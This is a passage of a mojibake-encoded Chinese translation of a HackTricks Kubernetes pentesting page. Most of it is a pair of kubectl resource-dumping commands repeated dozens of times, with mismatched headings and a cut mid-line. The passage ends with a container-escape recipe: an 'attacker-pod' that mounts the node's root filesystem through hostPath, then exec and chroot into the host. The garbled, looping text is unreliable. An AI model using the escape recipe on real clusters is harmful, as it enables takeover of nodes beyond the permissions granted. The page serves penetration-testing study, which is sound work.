è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœª
```
k get all
```
{% endtab %}
{% endtabs %}

### **è·å–Podsçš„èµ„æºæ¶ˆè€—æƒ…å†µ**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### ä»å®¹å™¨ä¸­é€ƒè„±

å¦‚æœä½ èƒ½å¤Ÿåˆ›å»ºæ–°çš„å®¹å™¨ï¼Œé‚£ä¹ˆä½ å¯èƒ½èƒ½å¤Ÿä»å®¹å™¨ä¸­é€ƒè„±åˆ°èŠ‚ç‚¹ä¸Šã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½ éœ€è¦ä½¿ç”¨ä¸€ä¸ªyamlæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œåˆ‡æ¢åˆ°åˆ›å»ºçš„å®¹å™¨ï¼Œç„¶åchrootåˆ°èŠ‚ç‚¹çš„ç³»ç»Ÿä¸­ã€‚ä½ å¯ä»¥ä½¿ç”¨å·²ç»å­˜åœ¨çš„å®¹å™¨ä½œä¸ºyamlæ–‡ä»¶çš„å‚è€ƒï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºäº†ç°æœ‰çš„é•œåƒå’Œè·¯å¾„ã€‚
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> å¦‚æœæ‚¨éœ€è¦åœ¨ç‰¹å®šèŠ‚ç‚¹ä¸Šåˆ›å»ºPodï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–èŠ‚ç‚¹ä¸Šçš„æ ‡ç­¾ï¼š
>
> `k get nodes --show-labels`
>
> é€šå¸¸ï¼Œkubernetes.io/hostnameå’Œnode-role.kubernetes.io/masteréƒ½æ˜¯ç”¨äºé€‰æ‹©çš„å¥½æ ‡ç­¾ã€‚
>
> [å‚è€ƒé“¾æ¥]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
>
> ç„¶åï¼Œæ‚¨å¯ä»¥åˆ›å»ºattack.yamlæ–‡ä»¶ã€‚
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[åŸå§‹çš„yamlæºä»£ç ](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ä¹‹åï¼Œæ‚¨åˆ›å»ºäº†podã€‚
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ç°åœ¨ä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤åˆ‡æ¢åˆ°åˆ›å»ºçš„ podï¼š
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- bash # attacker-pod is the name defined in the yaml file
```
æœ€åï¼Œæ‚¨å°†chrootè¿›å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿ
```bash
chroot /root /bin/bash
```
ä»ä»¥ä¸‹æ¥æºè·å–çš„ä¿¡æ¯ï¼š[Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## å‚è€ƒèµ„æ–™

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
